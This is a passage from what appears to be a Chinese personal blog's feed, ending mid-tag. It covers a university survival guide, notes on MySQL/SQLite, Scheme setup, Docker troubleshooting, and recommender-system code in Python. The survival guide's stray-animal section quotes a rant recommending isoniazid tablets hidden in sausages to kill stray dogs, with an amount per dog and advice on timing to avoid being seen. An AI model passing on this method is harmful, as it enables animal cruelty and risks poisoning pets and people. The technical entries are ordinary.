id="高树大雾">高树大雾</h3><p>你可能从学长那里听说过杨物运动的传说，不过现在杨物运动已经彻底流产了。 现在高数大物的难度几乎越来越水，电分和模电也越来越水（17级貌似都直接合并了）</p><h3 id="思修马原毛概军理形势与政策">思修马原毛概军理形势与政策</h3><p>从17年开始加大力度，改为了闭卷，然而问题不大（你要是遇上侯伦广当我没说），上课不用听，期末会划一点重点，搞到往年的题刷一下，原题很多</p><h3 id="通识课程">通识课程</h3><p>个人认为是L校长的一大败笔，全员水课 核心通识交叉通识是要计入保研和GPA的，这就导致了素质教育和刷分不可调和的矛盾。水课大受欢迎，硬课无人问津甚至因为选课人数过少停课。</p><h3 id="未完待续等待填坑">未完待续，等待填坑</h3><h2 id="注意安全">注意安全</h2><h3 id="流浪猫狗">流浪猫狗</h3><p>你电不负责任的猫奴狗奴小动保还是很多的，流浪猫狗也是很多的。保卫处也是并不怎么负责仁的，大家自求多福。下面引用一段helaso的话： &gt;学姐昨天去银桦在门口被狗追，那疯狗追上去用嘴擦到了一下。虽然没流血还是建议学姐去打狂犬疫苗了，也联系了保卫处。今天好了，4只流浪狗在组团门口耍。 打电话给保卫处，他们说最近爱狗人士多不能打狗？？？ 是不是保卫处领导学辅导员和稀泥上瘾了？ 在此我要推荐一款异烟肼神药给保卫处大爷，对人几乎无毒，肺结核病人的救命药，塞到香肠里一两片就能搞死一只狗。早上趁圣母婊学生还没起床让阿姨扫地时撒，晚上天色一暗就能让阿姨收尸了。铁棍打狗还不带枪那是lowb才用的方法了，俄罗斯之前肃清流浪狗就在街上狂撒这药。 保卫处大爷再护着狗爹迟早会有学生被咬出重伤，到时知乎热门等着瞧。</p><h3 id="食堂">食堂</h3><p>腐败变质的食品很多（早上的包子、饼），还有烟头假牙钢丝球瓷砖大礼包随机放送。如果你去学子一楼，恭喜你，拉肚子几率加倍。</p><h2 id="注">注</h2><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p>不是说N年前的书不好，奥本海姆的信号与系统、高德纳的计算机程序设计艺术、k&amp;r的C程序设计语言、TCP/IP协议、朗道、铃木雅臣的模电，都是经典的好书。但是你电的EE/CS行业基本都变化很快，N年前的书基本落后工业界至少N+5年了，而很多变化很快的选修课恰恰喜欢用N年不改的教材（很多还是本校老师自编的垃圾教材）。而且你电不少课本的质量就算没落伍也不比谭某人强（尤其是那些什么电子科大出版社、科学出版社的自编教材），你看多了这种书基本就废了。<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;p&gt;你说我一个渣渣，硬件不精，软件不熟，边缘学院，劝退专业，没有国奖，没有论文，现在刚大四保完研都还没毕业，怎么就有脸来写生存指北了呢？</summary>
    
    
    
    <category term="彼黍离离" scheme="https://zhangjk98.xyz/categories/%E5%BD%BC%E9%BB%8D%E7%A6%BB%E7%A6%BB/"/>
    
    
    <category term="你电" scheme="https://zhangjk98.xyz/tags/%E4%BD%A0%E7%94%B5/"/>
    
  </entry>
  
  <entry>
    <title>MySQL从入门到跑路</title>
    <link href="https://zhangjk98.xyz/45b9/"/>
    <id>https://zhangjk98.xyz/45b9/</id>
    <published>2019-11-01T09:09:46.000Z</published>
    <updated>2019-11-01T09:09:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>用了这么久数据库，现在还只会增删查改，开个坑学学优化。 <a id="more"></a> 等待填坑</p><p>这个图比较清晰</p><p><img src="/45b9/db.webp" /></p><p>看到clickhouse的速度很快，有空看一下</p><h2 id="轻如鸿毛的sqlite">轻如鸿毛的SQLite</h2><p>好东西，在性能严重受限的开发板上跑着非常舒服，反正以前我试着感觉比另一个嵌入式数据库BerkeleyDB感觉好用多了。</p><p>其实我感觉很多小网站什么的，根本没必要上MySQL之类的东西，SQLite完全够了。什么存储过程啊，什么访问控制用户权限管理啊，基本上不怎么能用得到。数据量也小，那就索性连索引都不要了。 没有那一堆臃肿的东西，也没有那一堆乱七八糟的依赖。</p><p>而且这个东西快啊，数据量不怎么大的情况下比MySQL快，配置也简单</p><h2 id="你们这个是什么教材啊你们真的是害人不浅啊你们这个教材">你们这个是什么教材啊，你们真的是害人不浅啊你们这个教材</h2><h3 id="一张大表不好吗">一张大表不好吗</h3><blockquote><p>范式，什么范式？</p></blockquote><p>课本上这个要新建一张表，那一张表，好多个表</p><h3 id="隔离性">隔离性</h3><p>clickhouse那么快的原因就是一定程度上破坏了隔离性</p><h3 id="原子性">原子性</h3><p>MySQL在5.7以后支持了json，或许是感受到了Postgres的压力。</p><h2 id="好用的干活工具">好用的干活工具</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RiY2xpL215Y2xp">mycli<i class="fa fa-external-link-alt"></i></span> MySQL的cli工具，能高亮和自动补全</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;用了这么久数据库，现在还只会增删查改，开个坑学学优化。</summary>
    
    
    
    <category term="笔记&amp;札记" scheme="https://zhangjk98.xyz/categories/%E7%AC%94%E8%AE%B0-%E6%9C%AD%E8%AE%B0/"/>
    
    
    <category term="MySQL" scheme="https://zhangjk98.xyz/tags/MySQL/"/>
    
    <category term="Database" scheme="https://zhangjk98.xyz/tags/Database/"/>
    
  </entry>
  
  <entry>
    <title>λ演算&amp;函数式编程</title>
    <link href="https://zhangjk98.xyz/a10f/"/>
    <id>https://zhangjk98.xyz/a10f/</id>
    <published>2019-10-29T13:59:33.000Z</published>
    <updated>2019-10-29T13:59:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>等待填坑 <a id="more"></a> ## 摸鱼一时爽</p><p>函数式编程(Functional Programming)好像比面向对象抽象程度更高。但是之前折腾硬件的时候都没有用到过，可能是不太适合处理IO接口和操作时序吧。 之前在图书馆乱翻，看到一本七周七语言的书，翻到函数式，感觉还挺有意思，教研室的摸鱼生活就搞点这个吧，反正干正事是不可能干正事的 <del>正在进JavaScript的坑，将就着用js来练练手吧。</del> javascript味不对，还是直接上了Lisp</p><h2 id="λ演算λ-calculus">λ演算(λ-calculus)</h2><ul><li>是匿名的</li><li>只有一个输入</li></ul><p>多输入的函数要转成多个只有一个输入的函数的嵌套调用，也就是柯里化（currying）</p><p><span class="math inline">\(\lambda\)</span>项</p><h2 id="附">附</h2><h3 id="环境配置">环境配置</h3><p>Arch下安装mit-sheme包就好了，SICP的练习环境。这个操作基本跟Emacs差不多，是SICP的作业环境。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S mit-scheme<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过我用的是这个Chez Scheme，前几年开源了的东西，速度很快</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S chez-scheme<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行直接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">scheme <span class="token operator">&lt;</span> test.scm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就好了</p><p>我不习惯Emacs的快捷键，都是在vscode里写的，装一个vscode-scheme插件就好了。可以在code runner插件里配置一下，然后按快捷键运行</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"code-runner.executorMap"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">".scm"</span><span class="token operator">:</span> <span class="token string">"scheme &lt; "</span><span class="token punctuation">,</span>    <span class="token property">"scheme"</span><span class="token operator">:</span> <span class="token string">"scheme &lt; "</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>详见 https://github.com/cisco/ChezScheme</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;等待填坑</summary>
    
    
    
    <category term="不务正业系列" scheme="https://zhangjk98.xyz/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="λ-calcus" scheme="https://zhangjk98.xyz/tags/%CE%BB-calcus/"/>
    
    <category term="js" scheme="https://zhangjk98.xyz/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>Docker笔记</title>
    <link href="https://zhangjk98.xyz/69d4/"/>
    <id>https://zhangjk98.xyz/69d4/</id>
    <published>2019-10-18T13:31:55.000Z</published>
    <updated>2019-10-18T13:31:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>开始折腾Docker，等待填坑 <a id="more"></a> 容器化到底拿来干什么呢</p><p>Docker还可以套娃，Docker里面跑Docker</p><h2 id="基本设置和操作">基本设置和操作</h2><h3 id="docker设置">Docker设置</h3><p>一定要先启动, 不然有可能<code>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> docker start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用<code>docker exec -it XXXXXX bash</code>进入容器的命令界面，输入exit退出</p><p>同步Docker容器和宿主机的时间：<code>docker cp /etc/localtime &lt;container id&gt;:/etc/localtime</code></p><p>加当前用户到用户组里面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gpasswd -a <span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="离线装docker镜像">离线装Docker镜像</h4><p>教研室服务器的网一直出问题，还有一台机子没有外网 决定离线搞Docker镜像 发现Docker有离线的方法，就是直接在别的机子上pull，然后</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker save -o mysql.tar mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把生成的tar文件拷到服务器上</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker load -i  mysql.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="docker-compose-部署">Docker Compose 部署</h3><p>当部署多个Docker容器，它们之间还有关联的时候，就用Compose代替Docker run，比如师兄Flask写的标注工具，就是前后端分别一个Docker容器</p><p>运行：<code>docker-compose up</code>自动创建</p><h3 id="docker镜像">Docker镜像</h3><p>Docker镜像（image）也是一堆文件，可以自己建或者从远程pull别人建好的 有了Docker镜像，再写好Dockerfile就可以跑起来了（跑起来之后就是个容器container）</p><h3 id="dockerfile">Dockerfile</h3><p>语法近似bash脚本，填写好之后启动会根据文件里面的配置逐步执行</p><h2 id="常用命令">常用命令</h2><table><thead><tr class="header"><th>Command</th><th>功能</th></tr></thead><tbody><tr class="odd"><td>Docker build</td><td>创建镜像</td></tr><tr class="even"><td>Docker create</td><td>创建镜像（并不启动）</td></tr><tr class="odd"><td>Docker exec</td><td>在Docker里面执行命令</td></tr><tr class="even"><td>Docker images</td><td>查看镜像</td></tr><tr class="odd"><td>Docker pull/push</td><td>下载/上传镜像</td></tr><tr class="even"><td>Docker rm/rmi</td><td>删除容器/镜像</td></tr><tr class="odd"><td>Docker export/import</td><td>导出导入容器</td></tr><tr class="even"><td>Docker import/load</td><td>导出导入镜像</td></tr><tr class="odd"><td>Docker start/stop/restart/pause/unpause/kill</td><td>略</td></tr></tbody></table><h2 id="踩坑记录">踩坑记录</h2><p>各位看官散了吧，都是一堆弱智操作搞的</p><h3 id="一次弱智的踩坑">一次弱智的踩坑</h3><p><code>Failed to enable unit: Unit file /etc/systemd/system/docker.service is masked.</code></p><p>执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl unmask docker.servicesystemctl unmask docker.socketsystemctl start docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>出现 <code>Job for docker.service failed because the control process exited with error code. See "systemctl status docker.service" and "journalctl -xe" for details.</code></p><p>出现<code>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></p><p>出现<code>systemd[1]: Failed to start LSB: Create lightweight, portable, self-sufficie</code></p><p>Docker pull出现<code>Error response from daemon: Get https://registry-1.docker.io/v2/: dial tcp 34.201.196.144:443: connect: connection refused</code></p><p>是镜像源或者DNS的问题，参照<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC9taXJyb3IuaHRtbA==">这里<i class="fa fa-external-link-alt"></i></span>改了。（阿里的和中科大的教研室的鬼畜教育网根本不稳，最后换了华为的（要注册账号））</p><p>出现<code>pkg_resources.DistributionNotFound: The 'docker-compose==1.8.0' distribution was not found and is required by the application</code></p><p>想用Docker-compose结果报了一堆python的错</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">Traceback (most recent call last):  File &quot;&#x2F;usr&#x2F;bin&#x2F;docker-compose&quot;, line 5, in &lt;module&gt;    from pkg_resources import load_entry_point  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2927, in &lt;module&gt;    @_call_aside  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2913, in _call_aside    f(*args, **kwargs)  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2940, in _initialize_master_working_set    working_set &#x3D; WorkingSet._build_master()  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 635, in _build_master    ws.require(__requires__)  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 943, in require    needed &#x3D; self.resolve(parse_requirements(requirements))  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 829, in resolve    raise DistributionNotFound(req, requirers)pkg_resources.DistributionNotFound: The &#39;docker-compose&#x3D;&#x3D;1.8.0&#39; distribution was not found and is required by the application<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到网上的解决方案说</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> backports.ssl_match_hostname --upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果pip3居然又报错了了</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">pip is configured with locations that require TLS&#x2F;SSL, however the ssl module in Python is not available.Collecting backports.ssl_match_hostname  Retrying (Retry(total&#x3D;4, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;  Retrying (Retry(total&#x3D;3, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;  Retrying (Retry(total&#x3D;2, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;  Retrying (Retry(total&#x3D;1, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>哇，又是SSL证书的问题</p><p>参照<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDU5NTQ1MjgvcGlwLWlzLWNvbmZpZ3VyZWQtd2l0aC1sb2NhdGlvbnMtdGhhdC1yZXF1aXJlLXRscy1zc2wtaG93ZXZlci10aGUtc3NsLW1vZHVsZS1pbg==">stackoverflow的解决方案<i class="fa fa-external-link-alt"></i></span></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -s<span class="token function">apt</span> <span class="token function">install</span> libssl-dev libncurses5-dev libsqlite3-dev libreadline-dev libtk8.5 libgdm-dev libdb4o-cil-dev libpcap-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>切到<code>the folder with the Python 3.X library source code</code>，一般在<code>/usr/local/bin</code>底下的python文件夹 运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>依然不行 怀疑是SSL证书的问题，curl使用ssl也报错 但是openssl、libssl-dev都装了的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> ca-certificates<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>证书没过期</p><p>又运行了一下openssh居然报错connect:errno=111</p><p>查了一下 &gt;This has nothing to do with SSL. Connection refused means that either there is no server or the connection is blocked by firewall. In your case (before your edit) the server is also plain wrong, i.e. ":443" is no valid server name (hostname missing).</p><p>难道就是防火墙的问题吗？</p><p>查看了一下网络状态</p><p>没问题的工作站</p><pre class="line-numbers language-none"><code class="language-none">tcp        0      0 211.83.111.221:40294    211.83.111.224:443      ESTABLISHED 1825&#x2F;telnet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有问题的服务器</p><pre class="line-numbers language-none"><code class="language-none">tcp6       0      0 :::443                  :::*                    LISTEN      101411&#x2F;apache2tcp6       0      0 211.83.111.224:443      211.83.111.221:40294    ESTABLISHED 101415&#x2F;apache2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>难道学校的ipv6又炸了？</p><p>试试<code>nc -l 443</code></p><p>emmm，被占用了</p><p>不对，我傻逼了，这是对外的端口啊。。。。</p><p>等吧</p><p><strong>更新</strong>是网费没了没充钱的问题...... 老蔡师兄不是校内的网连不上也是没充钱学校网管给断外网了...... 前几天那个Ubuntu Desktop的工作站最近也没钱了，但是http在终端可以用，镜像源什么的也能连，但是那个浏览器一打开就提示我登录账号。 突然意识到了不对，怀疑服务器的网也没钱了。 其实之前一直怀疑是被制裁了，但是工作站就是好的，才一直以为是SSL证书之类的问题 充钱之后，神奇的都能用了 看来是http神奇的逃脱了没钱的制裁 行吧，在这里排查了四五天，期间还重装过好几次Ubuntu Server 果然还是得充钱啊</p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/jiaqian.png" alt="Picture" style="zoom:60%;" /></p><h2 id="参考">参考</h2><h2 id="再看docker">再看Docker</h2><p>被人骗入坑Docker，甚至教研室服务器上基本全是Docker跑的一个个容器，甚至MySQL都是跑在Docker上的。</p><p>Docker 网络那里</p><p>http://dockone.io/article/660 https://jimmysong.io/docker-handbook/</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开始折腾Docker，等待填坑</summary>
    
    
    
    <category term="笔记&amp;札记" scheme="https://zhangjk98.xyz/categories/%E7%AC%94%E8%AE%B0-%E6%9C%AD%E8%AE%B0/"/>
    
    
    <category term="Docker" scheme="https://zhangjk98.xyz/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>推荐系统笔记</title>
    <link href="https://zhangjk98.xyz/bccd/"/>
    <id>https://zhangjk98.xyz/bccd/</id>
    <published>2019-10-18T01:52:43.000Z</published>
    <updated>2019-10-18T01:52:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>等待填坑 <a id="more"></a> 大概分为用户建模模块、推荐对象建模模块、推荐算法模块</p><h2 id="主要算法">主要算法</h2><h3 id="协同过滤算法">协同过滤算法</h3><p>最老最经典的一个算法了，大概是给用户推荐兴趣和关注点相似用户的感兴趣内容。</p><p>协同过滤有基于领域的方法(neighborhood methods)和隐语义模型(latent factor models)，基于图的随机游走算法(random walk on graph) 下面两个是基于邻域的方法：</p><h4 id="基于物品的协同过滤">基于物品的协同过滤</h4><p>（item-based collaborative filtering，ItemCF） 找到物品之间的属性关联，向用户推荐属性相似的物品 设N(i)是喜欢i物品的用户数 相似度：</p><p><span class="math display">\[w_{ij}=\frac{|N(i)\cap N(j)|}{|N(j)|}\]</span></p><p>避免热门物品干扰，改为</p><p><span class="math display">\[w_{ij}=\frac{|N(i)\cap N(j)|}{\sqrt{|N(j)||N(i)|}}\]</span></p><h4 id="基于用户的协同过滤">基于用户的协同过滤</h4><p>（User-based collaborative filtering，UserCF） 找到和用户相似的其他用户，将其他用户感兴趣的产品推荐给用户。还有一种是“购买过XXX等用户也XXX”，算是这个方法的一个变种</p><p>计算相似度，N(u)是用户正反馈的集合，N(v)是用户负反馈物品的集合 Jaccard相似度：</p><p><span class="math display">\[w_{u,v}= \frac{|N(u)\cap N(v)|}{|N(u)\cup N(v)|}\]</span></p><p>余弦相似度：</p><p><span class="math display">\[w_{u,v}= \frac{|N(u)\cap N(v)|}{\sqrt{|N(u)||N(v)|}}\]</span></p><h2 id="冷启动问题">冷启动问题</h2><p>等待填坑，利用用户注册信息，人工标注等</p><h2 id="大众行为个性化推荐">大众行为/个性化推荐</h2><p>等待填坑</p><h2 id="imdb电影评论推荐例子">imdb电影评论推荐例子</h2><p>这里使用<span class="exturl" data-url="aHR0cDovL2ZpbGVzLmdyb3VwbGVucy5vcmcvZGF0YXNldHMvbW92aWVsZW5zLw==">movielens数据集<i class="fa fa-external-link-alt"></i></span>， 数据集的rating.csv包括用户id，物品id，评分，评论时间。(这个csv文件第一行是userid，movieid，·····，把第一行直接删掉或者从第二行开始读取，不然会报TypeError: unsupported operand type(s) for -: 'str' and 'int'的错) 使用的算法是SVD矩阵分解。构建一个用户-物品矩阵，每一项的值是评分，这是一个极其稀疏的矩阵 我们导入数据集并分割：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">header <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">,</span> <span class="token string">'item_id'</span><span class="token punctuation">,</span> <span class="token string">'rating'</span><span class="token punctuation">,</span> <span class="token string">'timestamp'</span><span class="token punctuation">]</span>  <span class="token comment"># 用户id，物品id，评分，评论时间</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'../data/u.data'</span><span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">,</span> names<span class="token operator">=</span>header<span class="token punctuation">)</span>n_users <span class="token operator">=</span> df<span class="token punctuation">.</span>user_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#用户数量</span>n_items <span class="token operator">=</span> df<span class="token punctuation">.</span>item_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#物品数量</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Number of users = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_users<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' | Number of movies = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_items<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 数据集分割——训练集：测试集 = 3:1</span>train_data<span class="token punctuation">,</span>test_data <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>df<span class="token punctuation">,</span> test_size <span class="token operator">=</span> <span class="token number">0.25</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>建立评分矩阵 <pre class="line-numbers language-python" data-language="python"><code class="language-python">train_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>test_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#使用 pandas 遍历行数据</span><span class="token keyword">for</span> line <span class="token keyword">in</span> train_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#训练集评分矩阵</span>    train_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> test_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#测试集评分矩阵</span>    test_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>计算余弦相似度：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">user_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span>  <span class="token comment"># 计算余弦距离</span>item_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">.</span>T<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>基于用户和基于物品的协同过滤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>rating<span class="token punctuation">,</span> similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'user'</span><span class="token punctuation">:</span>        <span class="token comment"># </span>        mean_user_rating <span class="token operator">=</span> rating<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>axis <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#mean函数：压缩列，对各行求均值，返回 m *1 矩阵</span>        <span class="token comment"># print(mean_user_rating)</span>        rating_diff <span class="token operator">=</span> <span class="token punctuation">(</span>rating <span class="token operator">-</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span><span class="token punctuation">)</span>        pred <span class="token operator">=</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span> <span class="token operator">+</span> similarity<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>rating_diff<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T        <span class="token comment">#dot函数：矩阵相乘；np.abs()：矩阵元素的绝对值  .T:转置</span>        <span class="token comment"># print('test',pred.min())</span>    <span class="token keyword">elif</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'item'</span><span class="token punctuation">:</span>        pred <span class="token operator">=</span> rating<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>similarity<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># print('test2',pred.max())</span>    <span class="token keyword">return</span> pred<span aria-hidden="true" 